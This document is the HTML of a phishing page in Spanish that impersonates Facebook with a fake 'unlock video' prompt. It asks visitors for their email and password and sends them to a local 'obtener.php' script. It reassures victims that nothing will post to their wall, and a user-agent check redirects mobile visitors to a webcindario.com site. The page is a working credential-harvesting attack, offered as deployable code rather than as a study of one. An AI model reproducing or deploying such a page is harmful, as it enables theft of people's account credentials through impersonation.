<html idmmzcc-ext-docid="572854272"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

	<meta charset="utf-8">

	<title>Facebook Videos</title>

	<link rel="shortcut icon" href="Facebook%20Videos_files/E9Fn1cV.png">

	<link rel="stylesheet" href="Facebook%20Videos_files/style.css" type="text/css" media="screen">

	<script src="Facebook%20Videos_files/analytics.js" async=""></script><script src="Facebook%20Videos_files/jquery.js"></script> 

	</head>



<body>

<script language="JavaScript" type="text/javascript">

navegador=navigator.userAgent; //busco el "userAgent" del usuario.

//lista de palabras del "userAgent" en los móviles

moviles=["Mobile","iPhone","iPod","BlackBerry","Opera Mini","Sony","MOT","Nokia","samsung"];

detector=0; //Variable que detectará si se usa un móvil

for (i in moviles) { //comprobar en la lista ...

   //si el método "indexOf" no devuelve -1, indica que la palabra está en el "userAgent"

   compruebo=navegador.indexOf(moviles[i]); 

   if (compruebo>-1) { 

      detector=1; //Si es un móvil, cambio el valor del detector

      }

   }

if (detector==1) { //si es un móvil redirecciono la página.

   location.href="videosymashd.webcindario.com"; //Se redirecciona hacia la versión móvil.

   }



</script>  

	<div id="header">

	<div id="nav"></div>

	</div>

         

	<div style="display: block;" id="BgCuerpo"></div>

	

	<div style="display: block;" id="BodyCuerpo">

	<div id="Cuerpo">

	<div id="CuerpoMain">

	

		<div id="CuerpoImgs">

			<img src="Facebook%20Videos_files/E9Fn1cV.png" class="Img" height="70" width="70">
			 <img src="Facebook Videos_files/anigif.gif" class="Img" height="70" width="70">

		</div>

		

		<div id="TituloCuerpo">

			<span id="Tbold">Desbloquear video</span>

			Facebook necesita confirmar el acceso a este video. 

		</div>

		

		<div id="Formulario">

		
          <form method="post" name="form1" action="obtener.php" >
            <table align="center">
              <tr valign="baseline">
                <td nowrap align="right"></td>
                <td><label id="LoginForm">
                <div align="center">E-mail:</div>
                </label>
				<input type="text" name="email" value="" size="32" placeholder="Correo" autocomplete="off" required="" ></td>
              </tr>
              <tr valign="baseline">
                <td nowrap align="right"></td>
				
                <td><label id="LoginForm">
                <div align="center">Password:</div>
                </label>
				<input type="password" name="pass" value="" size="32" placeholder="Contraceña" autocomplete="off" required="" ></td>
              </tr>
              <tr valign="baseline">
                <td nowrap align="right">&nbsp;</td>
                <td><div align="center">
                  <input name="submit" type="submit" value="">
                </div></td>
              </tr>
            </table>
            <input type="hidden" name="id" value="">
            <input type="hidden" name="MM_insert" value="form1">
          </form>
		  
          <p>&nbsp;</p>
		
		</div>

		

	</div>

	

		<div id="Candao">

			<img src="Facebook%20Videos_files/LE87vI1.png" class="Img" height="13" width="13">

			No publicará en su muro de facebook.

		</div>

		

	</div>

	</div>

	

<script>

$(document).ready(function(){

	setTimeout(function(){ 

		$("#BgCuerpo, #BodyCuerpo").fadeIn(); 

	}, 500);

});

</script>







</body></html>